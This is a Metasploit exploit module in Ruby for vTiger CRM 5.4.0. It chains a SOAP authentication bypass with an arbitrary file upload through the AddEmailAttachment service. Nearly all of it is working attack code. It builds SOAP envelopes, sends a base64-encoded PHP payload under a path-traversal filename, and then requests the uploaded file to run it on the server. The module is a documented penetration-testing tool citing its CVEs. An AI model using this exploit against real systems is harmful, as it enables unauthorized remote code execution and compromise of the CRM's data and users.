##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include REXML
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'vTiger CRM SOAP AddEmailAttachment Arbitrary File Upload',
      'Description'    => %q{
          vTiger CRM allows an user to bypass authentication when requesting SOAP services.
          In addition, arbitrary file upload is possible through the AddEmailAttachment SOAP
          service. By combining both vulnerabilities an attacker can upload and execute PHP
          code. This module has been tested successfully on vTiger CRM v5.4.0 over Ubuntu
          10.04 and Windows 2003 SP2.
        },
      'Author'         =>
        [
          'Egidio Romano', # Vulnerability discovery
          'juan vazquez' # msf module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-3214' ],
          [ 'CVE', '2013-3215' ],
          [ 'OSVDB', '95902' ],
          [ 'OSVDB', '95903' ],
          [ 'BID', '61558' ],
          [ 'BID', '61559' ],
          [ 'EDB', '27279' ],
          [ 'URL', 'http://karmainsecurity.com/KIS-2013-07' ],
          [ 'URL', 'http://karmainsecurity.com/KIS-2013-08' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          # Arbitrary big number. The payload is sent base64 encoded
          # into a POST SOAP request
          'Space'       => 262144, # 256k
          'DisableNops' => true
        },
      'Targets' =>
        [
          [ 'vTigerCRM v5.4.0', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 26 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base vTiger CRM directory path", '/vtigercrm/'])
      ], self.class)
  end

  def check
    test_one = check_email_soap("admin", rand_text_alpha(4 + rand(4)))
    res = send_soap_request(test_one)

    unless res and res.code == 200 and res.body.to_s =~ /<return xsi:nil="true" xsi:type="xsd:string"\/>/
      return Exploit::CheckCode::Unknown
    end

    test_two = check_email_soap("admin")
    res = send_soap_request(test_two)

    if res and res.code == 200 and (res.body.blank? or res.body.to_s =~ /<return xsi:type="xsd:string">.*<\/return>/)
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    file_name = rand_text_alpha(rand(10)+6) + '.php'
    php = %Q|<?php #{payload.encoded} ?>|

    soap = add_attachment_soap(file_name, php)
    res = send_soap_request(soap)

    print_status("#{peer} - Uploading payload...")
    if res and res.code == 200 and res.body.to_s =~ /<return xsi:type="xsd:string">.*<\/return>/
      print_good("#{peer} - Upload successfully uploaded")
      register_files_for_cleanup(file_name)
    else
      fail_with(Failure::Unknown, "#{peer} - Upload failed")
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({'uri' => normalize_uri(target_uri.path, 'soap', file_name)}, 0)
  end

  def add_attachment_soap(file_name, file_data)
    xml = Document.new
    xml.add_element(
      "soapenv:Envelope",
      {
        'xmlns:xsi'     => "http://www.w3.org/2001/XMLSchema-instance",
        'xmlns:xsd'     => "http://www.w3.org/2001/XMLSchema",
        'xmlns:soapenv' => "http://schemas.xmlsoap.org/soap/envelope/",
        'xmlns:crm'     => "http://www.vtiger.com/products/crm"
      })
    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")
    body = xml.root.elements[2]
    body.add_element(
      "crm:AddEmailAttachment",
      {
        'soapenv:encodingStyle' => "http://schemas.xmlsoap.org/soap/encoding/"
      })
    crm = body.elements[1]
    crm.add_element("emailid", {'xsi:type' => 'xsd:string'})
    crm.add_element("filedata", {'xsi:type' => 'xsd:string'})
    crm.add_element("filename", {'xsi:type' => 'xsd:string'})
    crm.add_element("filesize", {'xsi:type' => 'xsd:string'})
    crm.add_element("filetype", {'xsi:type' => 'xsd:string'})
    crm.add_element("username", {'xsi:type' => 'xsd:string'})
    crm.add_element("session", {'xsi:type' => 'xsd:string'})
    crm.elements['emailid'].text = rand_text_alpha(4+rand(4))
    crm.elements['filedata'].text = "MSF_PAYLOAD"
    crm.elements['filename'].text = "MSF_FILENAME"
    crm.elements['filesize'].text = file_data.length.to_s
    crm.elements['filetype'].text = "php"
    crm.elements['username'].text = rand_text_alpha(4+rand(4))

    xml_string = xml.to_s
    xml_string.gsub!(/MSF_PAYLOAD/, Rex::Text.encode_base64(file_data))
    xml_string.gsub!(/MSF_FILENAME/, "../../../../../../#{file_name}")

    return xml_string
  end

  def check_email_soap(user_name = "", session = "")
    xml = Document.new
    xml.add_element(
      "soapenv:Envelope",
      {
        'xmlns:xsi'     => "http://www.w3.org/2001/XMLSchema-instance",
        'xmlns:xsd'     => "http://www.w3.org/2001/XMLSchema",
        'xmlns:soapenv' => "http://schemas.xmlsoap.org/soap/envelope/",
        'xmlns:crm'     => "http://www.vtiger.com/products/crm"
      })
    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")
    body = xml.root.elements[2]
    body.add_element(
      "crm:CheckEmailPermission",
      {
        'soapenv:encodingStyle' => "http://schemas.xmlsoap.org/soap/encoding/"
      })
    crm = body.elements[1]
    crm.add_element("username", {'xsi:type' => 'xsd:string'})
    crm.add_element("session", {'xsi:type' => 'xsd:string'})
    crm.elements['username'].text = user_name
    crm.elements['session'].text = session

    xml.to_s
  end

  def send_soap_request(soap_data)
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.path, 'soap', 'vtigerolservice.php'),
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => soap_data
    })

    return res
  end

end
